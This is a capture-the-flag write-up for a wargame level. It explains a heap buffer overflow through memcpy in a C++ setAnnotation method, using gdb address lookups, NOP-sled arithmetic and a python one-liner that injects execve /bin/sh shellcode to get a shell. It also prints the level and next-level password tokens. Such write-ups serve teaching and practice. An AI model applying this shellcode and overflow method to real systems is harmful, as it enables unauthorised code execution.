# Level 9
*password : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a*

## Analyze

```
$ scp -P 4242 level9@192.168.56.108:level9 binary/
```
0x6c = 108

## Buffer overflow : memcpy exploit
objective : execute `bin/sh`
- use memcpy to launch our shellcode
  - `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
- get some addresses
```
(gdb) disas main
...
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
  ...
(gdb) 
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) run test
(gdb) x/x $eax
0x804a00c
```
address `ptr` : 0x804a00c => access to the class\
address `ptr + 4` : 0x804a010 => access to the first element of the class
- compute NOP-sled length : 108 - 25 - 4 = 79

```
$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 79 +  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x0c\xa0\x04\x08"')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
